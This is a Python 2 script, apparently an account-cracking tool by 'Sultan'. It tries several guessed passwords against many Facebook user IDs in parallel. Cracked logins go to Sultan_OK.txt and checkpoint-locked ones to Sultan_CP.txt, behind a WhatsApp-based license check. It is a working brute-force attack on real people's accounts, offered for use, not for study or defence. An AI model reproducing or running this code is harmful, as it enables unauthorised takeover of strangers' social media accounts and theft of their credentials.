...
__author__ = 'Sultan'
__copyright = 'All rights reserved . Copyright Sultan'
...
header = {
    ...
    'user-agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
os.system('git pull')
os.system('clear')
...
\033[1;93m pp
 ...
 \033[32;1mCreator \033[37;1m: \033[33;1mSultan Ahmed

 \033[32;1mVersion \033[37;1m: \033[33;1m0.7
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/Mr-Khoso/Sultan-Pro/main/server.txt').text
    if to in r:
...
def reg2():
    ...
    print ' \033[1;92mCopy And send To Admin On Whatsapp press Enter to continue'
...
def log_menu():
	...
	print 47 * '-'
        ...
        print '\033[1;92m[3] Follow Sultan On Fb'
        print ''
        log_menu_s()
...
def log_menu_s():
    s = raw_input(' \033[1;97m╰─Sultan➤ ')
    if s == '1':
        log_fb()
    elif s == '2':
        log_token()
    elif s == '3':
        os.system('xdg-open https://facebook.com/meersultan.khoso/')
    else:
        print ''
...
def a_s():
    ...
    cps = []
    oks = []
    a_s = raw_input(' \033[1;97m╰─sultan➤ ')
    if a_s == '1':
        os.system('clear')
        print logo
        print ' \033[1;90mFor-example : \033[1;97m223344,334455,445566,556677,1234567\033[1;94m'
        print 47 * '-'
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\033[1;92mSultan Father Of Facebook\033[1;94m'
    print 47 * '-'
    print '\t\033[1;92mResults____________Fb ids___________Passwords\033[1;94m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;94m[Sultan-OK]➤ ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/Sultan_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;92m[Sultan-CP]➤ ' + uid + ' | ' + pass1
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;94m[Sultan-OK]➤ ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/Sultan_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;95m[Sultan-CP]➤ ' + uid + ' | ' + pass2
                    cp = open('Sultan_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;95m[Sultan-OK]➤ ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/Sultan_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;94m[Sultan-CP]➤ ' + uid + ' | ' + pass3
                        cp = open('Sultan_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;95m[Sultan-OK]➤ ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/Sultan_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;95m[Sultan-CP]➤ ' + uid + ' | ' + pass4
                            cp = open('Sultan_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
    ...
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;92mKHOSO BALOCH PROGRAMMING'
